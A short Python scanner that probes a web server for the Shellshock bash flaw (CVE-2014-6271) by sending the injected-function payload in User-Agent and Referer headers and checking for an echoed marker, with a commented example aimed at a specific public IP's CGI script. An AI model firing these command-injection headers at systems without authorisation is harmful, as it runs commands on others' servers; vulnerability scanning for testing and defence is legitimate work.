import requests
from colorama import Fore, Style, init

init(autoreset=True)

class ShellshockScanner:
    def __init__(self, target):
        self.target = target

    def scan_for_shellshock(self):
        headers = {
            "User-Agent": "() { :;}; echo; echo Vulnerable to Shellshock: $(/bin/bash -c 'echo CVE-2014-6271')",
            "Referer": "() { :;}; echo; echo Vulnerable to Shellshock: $(/bin/bash -c 'echo CVE-2014-6271')"
        }
        try:
            response = requests.get(self.target, headers=headers, timeout=5)
            if "Vulnerable to Shellshock: CVE-2014-6271" in response.text:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Vulnerable CVE-2014-6271       :{Fore.BLUE} https://www.exploit-db.com/exploits/34766{Style.RESET_ALL}")
            else:
                pass
        except requests.RequestException as e:
            pass
"""
# Örnek Kullanım
shellshock_scanner = ShellshockScanner("http://47.106.98.190/cgi-bin/test.cgi")
shellshock_scanner.scan_for_shellshock()
"""